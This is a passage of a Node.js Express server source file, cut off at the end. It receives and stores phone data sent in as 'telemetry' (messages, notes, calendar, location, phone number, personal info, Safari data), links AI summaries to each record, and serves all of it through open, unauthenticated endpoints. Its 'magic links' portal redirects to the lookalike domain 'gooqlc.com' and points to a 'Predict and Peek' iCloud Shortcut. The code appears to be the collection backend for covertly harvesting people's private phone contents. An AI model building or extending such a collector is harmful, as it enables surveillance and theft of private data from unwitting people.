const express = require('express');
const path = require('path');
const fs = require('fs');
const mongoose = require('mongoose');

const app = express();

// 15mb limit supports base64 images plus standard JSON requests
app.use(express.json({ limit: '15mb' }));

// Built-in CORS & Safari Cache-Control headers
app.use((req, res, next) => {
  res.set({
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
    'Pragma': 'no-cache',
    'Expires': '0'
  });
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// ==================================================
// 0. MONGODB ATLAS CONNECTION (FOR PERMANENT LINKS)
// ==================================================
const MONGO_URI = process.env.MONGO_URI;

if (!MONGO_URI) {
  console.warn('WARNING: MONGO_URI environment variable is not set!');
} else {
  mongoose.connect(MONGO_URI)
    .then(() => console.log('Connected to MongoDB Atlas'))
    .catch(err => console.error('MongoDB connection error:', err));
}

const portalSchema = new mongoose.Schema({
  masterRedirect: String,
  links: [{ id: String, title: String, url: String }]
});

const Portal = mongoose.model('Portal', portalSchema);

// ==================================================
// 1. KEEP-ALIVE HEALTH ROUTE
// ==================================================
app.get('/health', (req, res) => {
  res.status(200).send('OK');
});

// ==================================================
// 2. SCREENSHOT & TELEMETRY RECEIVER ROUTES
// ==================================================
const SUBMISSIONS_FILE = path.join(__dirname, 'submissions.json');

function getSubmissions() {
  if (!fs.existsSync(SUBMISSIONS_FILE)) {
    fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify([], null, 2));
    return [];
  }
  try {
    return JSON.parse(fs.readFileSync(SUBMISSIONS_FILE, 'utf8'));
  } catch (err) {
    return [];
  }
}

function saveSubmissions(subs) {
  fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify(subs, null, 2));
}

app.post('/api/submit', (req, res) => {
  try {
    const {
      personal_info_b64 = '',
      phone_number_b64 = '',
      calendar = '',
      cellular_plan = '',
      notes = '',
      messages = '',
      hotspot = '',
      location = '',
      safari = ''
    } = req.body || {};

    const submissions = getSubmissions();
    const newEntry = {
      id: Date.now().toString(),
      personal_info_b64,
      phone_number_b64,
      calendar,
      cellular_plan,
      notes,
      messages,
      hotspot,
      location,
      safari,
      timestamp: Date.now()
    };

    submissions.unshift(newEntry);
    saveSubmissions(submissions);

    return res.status(200).json({ success: true, message: 'Stored!', id: newEntry.id });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

app.get('/api/submissions', (req, res) => {
  const submissions = getSubmissions();
  return res.status(200).json({ success: true, submissions });
});

app.get('/api/latest', (req, res) => {
  const submissions = getSubmissions();
  if (submissions.length === 0) {
    return res.status(404).json({ success: false, error: 'No data yet' });
  }
  return res.status(200).json({ success: true, ...submissions[0] });
});

// ==================================================
// 3. AI SUMMARY HISTORY ROUTES
// ==================================================
const SUMMARIES_FILE = path.join(__dirname, 'summaries.json');

function getSummaries() {
  if (!fs.existsSync(SUMMARIES_FILE)) {
    fs.writeFileSync(SUMMARIES_FILE, JSON.stringify([], null, 2));
    return [];
  }
  try {
    return JSON.parse(fs.readFileSync(SUMMARIES_FILE, 'utf8'));
  } catch (err) {
    return [];
  }
}

function saveSummaries(summaries) {
  fs.writeFileSync(SUMMARIES_FILE, JSON.stringify(summaries, null, 2));
}

app.post('/api/summaries/submit', (req, res) => {
  try {
    const { text, submissionId = null } = req.body;
    if (!text || typeof text !== 'string') {
      return res.status(400).json({ success: false, error: 'Missing or invalid text field' });
    }

    const firstLine = text.split('\n')[0].trim();
    const title = firstLine.length > 0 ? firstLine : 'Untitled Summary';
    const timestamp = Date.now();

    const summaries = getSummaries();
    const newEntry = {
      id: Date.now().toString(),
      submissionId, // Links this AI summary directly to the telemetry record ID
      title,
      text,
      timestamp
    };

    summaries.unshift(newEntry);
    saveSummaries(summaries);

    return res.status(200).json({ success: true, entry: newEntry });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

app.get('/api/summaries', (req, res) => {
  const summaries = getSummaries();
  return res.status(200).json({ success: true, summaries });
});

// ==================================================
// 3.5 DATA DELETION ROUTES (NEW)
// ==================================================
app.post('/api/delete-item', (req, res) => {
  try {
    const { id, submissionId } = req.body;
    
    // Delete the Summary
    if (id) {
      let summaries = getSummaries();
      summaries = summaries.filter(s => String(s.id) !== String(id));
      saveSummaries(summaries);
    }
    
    // Delete the linked Telemetry Payload (prevents orphaned data)
    if (submissionId) {
      let submissions = getSubmissions();
      submissions = submissions.filter(s => String(s.id) !== String(submissionId));
      saveSubmissions(submissions);
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

app.post('/api/clear-data', (req, res) => {
  try {
    saveSubmissions([]);
    saveSummaries([]);
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

// ==================================================
// 4. MAGIC LINKS PORTAL ROUTES (DATABASE BACKED)
// ==================================================
async function getPortalData() {
  let data = await Portal.findOne();
  if (!data) {
    data = new Portal({
      masterRedirect: 'https://gooqlc.com/111z',
      links: [
        { id: '1', title: 'Google', url: 'https://google.com' },
        { id: '2', title: 'Predict and Peek', url: 'https://www.icloud.com/shortcuts/' }
      ]
    });
